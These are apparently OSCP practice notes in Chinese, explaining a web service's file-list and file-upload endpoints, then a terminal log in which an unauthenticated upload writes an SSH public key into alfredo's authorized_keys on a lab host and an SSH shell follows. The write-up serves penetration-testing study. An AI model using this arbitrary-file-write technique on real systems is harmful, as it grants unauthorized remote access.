- 你贴出的 `/help` 输出本身就包含了说明文字（JSON 里每一项后面有冒号说明）——例如：
    
    `"GET /file-list?dir=/tmp : List of the files" "POST /file-upload : Upload files"`
    
    这两行文字直接写明了用途：`List of the files`（列出文件）和 `Upload files`（上传文件）。这是最直接的证据。
    
- **HTTP 方法（GET vs POST）也在说明里**
    
    - `GET /file-list?...`：HTTP 的 GET 通常用于**读取/获取**资源，和“列目录/读取列表”语义一致。
        
    - `POST /file-upload`：HTTP 的 POST 常用于**提交/上传/创建**数据，和“上传文件”语义一致。  
        方法 + 路径名一起强化了我对用途的判断。
        
- **查询参数 `?dir=/tmp` 很能说明问题**  
    `/file-list?dir=/tmp` 中出现 `dir`（directory 的缩写）且值是 `/tmp`，这正是“要列出哪个目录”的典型参数，说明这个端点接受目录路径并返回该目录下的文件列表。
    
- **这是常见的命名约定**  
    在很多 web 服务或小工具里，开发者会用 `file-list`, `list-files`, `files`, `upload`, `file-upload` 这种直观命名，含义通常和名字一致。结合你给的帮助文本，几乎可以直接确定。

```
curl -X POST -F "file=@/home/sinner/Documents/oscp/test.txt" -F filename="/tmp/test.txt" http://192.168.185.249:33414/file-upload

```

这里做了两件事：

- `-F "file=@.../test.txt"` → 把本地文件作为 **file 字段**上传。
    
- `-F "filename=/tmp/test.txt"` → 同时告诉服务器，这个文件在远端要保存成 **/tmp/test.txt**。
`-X POST` — 这是 `curl` 的一个选项，意思是**强制把 HTTP 方法设为 POST**。
某些 `curl` 选项（比如 `-d/--data`、`-F/--form`）会**自动把方法设为 POST**，所以在这些情况下你**不必**加 `-X POST`

[Sep 24, 2025 - 07:02:12 (EDT)] exegol-default /workspace # curl -X POST -F "file=@/workspace/a.txt" -F filename="/tmp/a.txt" http://192.168.249.249:33414/file-upload

{"message":"File successfully uploaded"}
[Sep 24, 2025 - 07:02:46 (EDT)] exegol-default /workspace # ssh-keygen                          
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:sKSOydTEs9crtxH3vjtH1W+CEMFTz+b8BMNFf18r0xI root@exegol-default
The key's randomart image is:
+---[RSA 3072]----+
|         ..o.  .o|
|   .      +  + ..|
|    + o    o EB =|
|   o = +  .  +ooB|
|  . + o S .. =o++|
| o + .   + .. *oo|
|  + . . +   .. o.|
|       o o .. .  |
|        .   +=   |
+----[SHA256]-----+
[Sep 24, 2025 - 08:38:20 (EDT)] exegol-default /workspace # cd /root
[Sep 24, 2025 - 08:38:28 (EDT)] exegol-default ~ # ls
bettercap.history  bin  etc  nuclei-templates
[Sep 24, 2025 - 08:38:30 (EDT)] exegol-default ~ # chmod 600 /root/.ssh/id_rsa     
[Sep 24, 2025 - 08:40:18 (EDT)] exegol-default ~ # cp /root/.ssh/id_rsa.pub /workspace/a.txt
[Sep 24, 2025 - 08:42:22 (EDT)] exegol-default ~ # curl -X POST -F "file=@/workspace/a.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.249.249:33414/file-upload

{"message":"File successfully uploaded"}
[Sep 24, 2025 - 08:44:42 (EDT)] exegol-default ~ # ssh alfredo@192.168.249.249 -i /root/.ssh/id_rsa -p 20500

[Sep 24, 2025 - 08:46:54 (EDT)] exegol-default /workspace # ssh alfredo@192.168.249.249 -i /root/.ssh/id_rsa -p 25022
The authenticity of host '[192.168.249.249]:25022 ([192.168.249.249]:25022)' can't be established.
ED25519 key fingerprint is SHA256:kflJUZqQzlDWxXgGuod+HGsJPk++nvt5ZyveJgx1jgQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.249.249]:25022' (ED25519) to the list of known hosts.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ 